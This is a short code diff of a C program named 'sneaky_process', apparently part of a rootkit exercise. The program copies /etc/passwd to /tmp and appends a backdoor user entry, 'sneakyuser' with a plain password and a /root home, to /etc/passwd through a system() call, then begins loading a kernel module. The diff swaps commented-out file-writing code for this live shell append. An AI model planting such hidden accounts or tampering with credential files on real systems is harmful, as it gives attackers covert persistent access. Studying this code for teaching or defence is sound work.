@@ -9,10 +9,7 @@ int main(void) {
     printf("sneaky_process pid = %d\n", pid);
     //copt passwd file
     system("cp /etc/passwd /tmp");
-    //add new line to passwd
-    // FILE *out = fopen("/etc/passwd", "w");  
-    // fprintf(out, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");  
-    // fclose(out);  
+    //add new line to passwd 
     system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
     //load module
     char buffer [100];
